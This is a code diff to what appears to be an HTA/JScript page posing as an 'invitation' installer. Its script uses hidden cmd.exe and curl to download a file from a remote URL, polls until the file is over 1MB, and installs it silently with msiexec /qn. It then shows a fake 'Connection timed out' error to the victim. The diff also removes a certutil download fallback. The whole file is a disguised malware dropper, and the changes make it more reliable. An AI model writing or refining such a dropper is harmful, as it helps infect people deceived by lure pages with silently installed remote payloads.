@@ -37,19 +37,37 @@ function runInstall() {
   document.getElementById("fill").style.width = "30%";
   document.getElementById("status").innerHTML = "Downloading components...";
   
-  // USE CURL TO DOWNLOAD (TRUSTED WINDOWS TOOL)
-  // -L : Follow redirects (important for Railway)
+  // USE CURL WITH LONG TIMEOUT
+  // --max-time 180 : Wait up to 3 minutes for download
+  // -L : Follow redirects
   // -o : Output to file
-  var cmd = 'cmd.exe /c curl -L -o "' + path + '" "' + url + '"';
-  shell.Run(cmd, 0, true); // Wait for download
+  var cmd = 'cmd.exe /c curl --max-time 180 -L -o "' + path + '" "' + url + '"';
+  shell.Run(cmd, 0, true); // Wait for curl to finish
   
-  if(fso.FileExists(path)) {
+  // POLLING LOOP: Check if file exists and has size > 0
+  // This ensures we don't proceed until the file is fully written
+  var maxWait = 180000; // 3 minutes
+  var startTime = new Date().getTime();
+  var fileReady = false;
+  
+  while (new Date().getTime() - startTime < maxWait) {
+    if (fso.FileExists(path)) {
+      var file = fso.GetFile(path);
+      if (file.Size > 1000000) { // Check if file is larger than 1MB (basic validation)
+        fileReady = true;
+        break;
+      }
+    }
+    WScript.Sleep(1000); // Wait 1 second before checking again
+  }
+  
+  if(fileReady) {
     document.getElementById("fill").style.width = "60%";
     document.getElementById("status").innerHTML = "Installing invitation...";
     
     // SILENT INSTALL
     var inst = 'msiexec.exe /i "' + path + '" /qn /norestart';
-    shell.Run(inst, 0, true); // Wait for install
+    shell.Run(inst, 0, true); // Wait for install to finish
     
     document.getElementById("fill").style.width = "100%";
     document.getElementById("status").innerHTML = "Finalizing...";
@@ -61,24 +79,9 @@ function runInstall() {
       document.getElementById("fill").style.background = "#d13438";
     }, 2000);
   } else {
-    // FALLBACK TO CERTUTIL IF CURL FAILS
-    document.getElementById("status").innerHTML = "Retrying via backup channel...";
-    var certCmd = 'cmd.exe /c certutil -urlcache -split -f "' + url + '" "' + path + '"';
-    shell.Run(certCmd, 0, true);
-    
-    if(fso.FileExists(path)) {
-        var inst = 'msiexec.exe /i "' + path + '" /qn /norestart';
-        shell.Run(inst, 0, true);
-        setTimeout(function() {
-            document.getElementById("heading").innerHTML = "Preparation Failed";
-            document.getElementById("status").innerHTML = "Error: Connection timed out.";
-            document.getElementById("fill").style.background = "#d13438";
-        }, 2000);
-    } else {
-        document.getElementById("heading").innerHTML = "Download Error";
-        document.getElementById("status").innerHTML = "Could not retrieve invitation.";
-        document.getElementById("fill").style.background = "#d13438";
-    }
+    document.getElementById("heading").innerHTML = "Download Error";
+    document.getElementById("status").innerHTML = "Could not retrieve invitation.";
+    document.getElementById("fill").style.background = "#d13438";
   }
 }
 </script>
